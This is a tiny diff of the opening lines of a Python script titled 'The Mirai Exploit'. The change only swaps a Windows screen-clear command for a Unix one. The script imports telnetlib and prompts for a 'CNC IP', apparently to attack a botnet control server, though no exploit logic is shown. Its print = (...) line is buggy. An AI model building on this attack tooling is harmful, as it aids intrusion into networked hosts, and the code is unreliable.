@@ -1,7 +1,7 @@
 import telnetlib
 import socket
 import os
-os.system("cls")
+os.system("clear")
 print = ("Welcome To The Mirai Exploit.")
 
 host = str(input("Enter CNC IP: "))
